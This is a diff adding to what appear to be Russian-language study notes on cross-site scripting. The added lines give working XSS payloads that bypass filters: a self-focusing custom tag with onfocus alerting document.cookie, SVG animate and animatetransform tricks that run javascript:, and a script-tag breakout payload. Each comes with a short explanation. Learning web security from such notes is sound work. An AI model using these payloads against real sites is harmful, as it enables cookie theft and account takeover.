@@ -48,6 +48,27 @@
 - On Windows: `ALT+SHIFT+X` / `ALT+X`
 - On MacOS: `CTRL+ALT+X`
 - On Linux: `Alt+X`
+
+Пример нагрузки с кастомным тегом:
+``` html
+<qwe id=x onfocus=alert(document.cookie) tabindex=1>#x
+```
+> 1. Этот тег при загрузке фокусируется сам на себе и вызывает `alert`.
+
+Пример svg с заменой ссылки через `<animate>`:
+```html
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+```
+> 1. SVG — стандартный формат, поэтому браузеры доверяют содержимому и не блокируют разметку.
+> 2. Атрибут `href` поддерживает схемы `URI`; `javascript:` заставляет браузер выполнить встроенный код вместо перехода по ссылке.
+> 3. Псевдо-анимация `<animate>` меняет `href` на `javascript:-URI`, и достаточно клика по ссылке, чтобы выполнить `alert(1)`.
+
+или с `<animatetransform>`:
+```html
+<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
+```
+
+---
 # XSS into JavaScript
 Если ввод попадает в скрипт внутри HTML:
 1. Попытаться закрыть тег предыдущего скрипта и открыть новый: `</script><img src=1 onerror=alert(document.domain)>`
